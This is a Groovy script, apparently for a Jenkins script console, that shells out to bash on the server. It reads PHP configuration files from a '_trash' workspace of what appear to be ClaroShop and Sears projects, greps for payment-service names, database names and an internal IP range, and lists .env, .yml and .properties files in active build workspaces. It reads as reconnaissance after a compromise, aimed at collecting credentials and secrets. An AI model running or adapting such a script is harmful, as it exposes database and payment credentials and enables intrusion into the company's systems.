// MICRO-AG: Read ALL remaining local.php files in _trash
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer()
    def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(20000)
    out.toString().take(5000)
}

println "=== ClaroShop/rc1/local.php ==="
def rc1 = run("cat '/var/jenkins_home/workspace/_trash/name_it/ClaroShop/rc1/local.php' 2>/dev/null | head -80")
println rc1.take(3000)

println "\n=== ClaroShop/release/local.php ==="
def rel = run("cat '/var/jenkins_home/workspace/_trash/name_it/ClaroShop/release/local.php' 2>/dev/null | head -80")
println rel.take(2000)

println "\n=== Api/Release/V2/local.php ==="
def apiRel = run("cat '/var/jenkins_home/workspace/_trash/name_it/Api/Release/V2/local.php' 2>/dev/null")
println apiRel.take(2000)

println "\n=== LIST ALL REMAINING _trash files ==="
def remaining = run("find /var/jenkins_home/workspace/_trash/name_it -type f -not -path '*/.git/*' 2>/dev/null | grep -v '.gitignore' | head -50")
println remaining.take(2000)

println "\n=== GREP for T1pagos / dbasears / mrc-services / 172.27.141 in ALL _trash files ==="
def t1grep = run("grep -r -l 'T1\\|t1pago\\|sears\\|172.27.141\\|mrc-services\\|apifinca\\|dbasears' /var/jenkins_home/workspace/_trash/ 2>/dev/null | head -20")
println "Files with T1/sears keywords: " + t1grep.take(1000)

println "\n=== Active workspace: cs_msa_build_caja-ng ==="
def cajang = run("find /var/jenkins_home/workspace/cs_msa_build_caja-ng -type f -name '*.php' -o -name '*.env' -o -name '*.yml' -o -name '*.properties' 2>/dev/null | head -20")
println "caja-ng files: " + cajang.take(500)

println "\n=== Active workspace: claroshop_build_carritoms ==="
def carrito = run("find '/var/jenkins_home/workspace/claroshop_build_carritoms.dev.claroshop.com' -type f \\( -name '*.php' -o -name '.env*' -o -name '*.yml' -o -name '*.properties' \\) 2>/dev/null | head -20")
println "carritoms files: " + carrito.take(500)

println "=== DONE MICRO-AG ==="
